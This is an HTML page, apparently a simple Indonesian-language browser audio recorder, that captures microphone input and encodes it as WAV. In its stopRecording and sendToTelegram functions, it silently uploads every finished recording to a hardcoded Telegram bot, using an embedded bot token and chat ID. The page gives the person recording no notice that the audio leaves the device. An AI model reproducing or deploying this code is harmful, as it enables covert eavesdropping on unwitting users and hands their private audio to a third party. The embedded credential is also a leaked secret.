<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Record Audio</title>
</head>
<body>
    <button id="start">Mulai Rekaman</button>
    <button id="stop" disabled>Hentikan Rekaman</button>
    <p id="status">Status: Siap</p>

    <script>
        let audioContext;
        let mediaStream;
        let audioChunks = [];
        let scriptProcessor;

        document.getElementById('start').addEventListener('click', () => {
            document.getElementById('status').innerText = 'Status: Merekam...';
            startRecording();
            document.getElementById('start').disabled = true;
            document.getElementById('stop').disabled = false;
        });

        document.getElementById('stop').addEventListener('click', () => {
            document.getElementById('status').innerText = 'Status: Rekaman Selesai';
            stopRecording();
            document.getElementById('start').disabled = false;
            document.getElementById('stop').disabled = true;
        });

        async function startRecording() {
            audioContext = new (window.AudioContext || window.webkitAudioContext)();
            mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const source = audioContext.createMediaStreamSource(mediaStream);

            scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            source.connect(scriptProcessor);
            scriptProcessor.connect(audioContext.destination);

            scriptProcessor.onaudioprocess = (audioProcessingEvent) => {
                const inputData = audioProcessingEvent.inputBuffer.getChannelData(0);
                const buffer = new Float32Array(inputData);
                audioChunks.push(buffer);
            };
        }

        function stopRecording() {
            scriptProcessor.disconnect();
            audioContext.close();
            mediaStream.getTracks().forEach(track => track.stop());

            // Menggabungkan data audio
            const audioBlob = exportToWav(audioChunks);
            sendToTelegram(audioBlob);

            // Mengosongkan data untuk perekaman berikutnya
            audioChunks = [];
        }

        function exportToWav(buffers) {
            // Proses mengonversi data PCM menjadi WAV
            const length = buffers.reduce((sum, b) => sum + b.length, 0);
            const result = new Float32Array(length);

            let offset = 0;
            buffers.forEach(buffer => {
                result.set(buffer, offset);
                offset += buffer.length;
            });

            // Mengonversi Float32Array menjadi WAV Blob
            return encodeWav(result, audioContext.sampleRate);
        }

        function encodeWav(samples, sampleRate) {
            const buffer = new ArrayBuffer(44 + samples.length * 2);
            const view = new DataView(buffer);

            // Header file WAV
            writeString(view, 0, 'RIFF');
            view.setUint32(4, 36 + samples.length * 2, true);
            writeString(view, 8, 'WAVE');
            writeString(view, 12, 'fmt ');
            view.setUint32(16, 16, true);
            view.setUint16(20, 1, true);
            view.setUint16(22, 1, true);
            view.setUint32(24, sampleRate, true);
            view.setUint32(28, sampleRate * 2, true);
            view.setUint16(32, 2, true);
            view.setUint16(34, 16, true);
            writeString(view, 36, 'data');
            view.setUint32(40, samples.length * 2, true);

            // Data PCM
            let offset = 44;
            for (let i = 0; i < samples.length; i++, offset += 2) {
                const s = Math.max(-1, Math.min(1, samples[i]));
                view.setInt16(offset, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
            }

            return new Blob([view], { type: 'audio/wav' });
        }

        function writeString(view, offset, string) {
            for (let i = 0; i < string.length; i++) {
                view.setUint8(offset + i, string.charCodeAt(i));
            }
        }

        function sendToTelegram(audioBlob) {
            const botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y';
            const chatId = '6813368909';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('audio', audioBlob, 'recording.wav');

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: 'POST',
                body: formData,
            })
                .then(response => response.json())
                .then(result => {
                    console.log('Audio berhasil dikirim:', result);
                })
                .catch(error => {
                    console.error('Gagal mengirim audio ke Telegram:', error);
                });
        }
    </script>
</body>
</html>
